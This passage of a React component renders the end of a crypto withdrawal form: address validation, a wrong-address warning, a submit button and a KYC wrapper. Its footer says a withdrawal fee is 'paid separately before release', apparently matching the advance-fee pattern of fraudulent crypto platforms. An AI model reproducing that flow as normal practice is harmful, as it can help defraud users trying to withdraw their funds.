                        : <AlertCircle  size={11} className="text-danger flex-shrink-0" />
                      }
                      <span className={`font-mono text-xs tracking-wider ${addrValidation.valid ? 'text-success' : 'text-danger'}`}>
                        {addrValidation.valid ? `Valid ${coin} address` : addrValidation.message}
                      </span>
                    </div>
                  )}
                </div>

                <div className="flex gap-2 items-start bg-red-500/5 border border-red-500/20 p-3 rounded-lg">
                  <AlertCircle size={13} className="text-danger mt-0.5 flex-shrink-0" />
                  <span className="text-xs text-slate-400 leading-relaxed">
                    Double-check your wallet address and network. Funds sent to a wrong address cannot be recovered.
                  </span>
                </div>

                <button
                  type="submit"
                  disabled={!cryptoCanProceed}
                  className="w-full px-4 py-3 rounded-lg bg-yellow-500/20 border border-yellow-500/40 text-yellow-400 hover:bg-yellow-500/30 disabled:opacity-50 transition font-mono text-xs font-bold tracking-wider uppercase flex items-center justify-center gap-2"
                >
                  Review Withdrawal <ChevronRight size={14} />
                </button>
              </form>
            )}
          </div>

          {/* Footer */}
          <div className="mt-4 flex justify-center items-center gap-2">
            <TrendingUp size={10} className="text-slate-500" />
            <span className="text-xs text-slate-500 tracking-wider">
              Secure withdrawals · Fee paid separately before release
            </span>
          </div>
        </div>
      </main>
    </>
  );
}

export default function WithdrawPage() {
  return (
    <KYCGuard requiredFor="make withdrawals">
      <WithdrawContent />
    </KYCGuard>
  );
}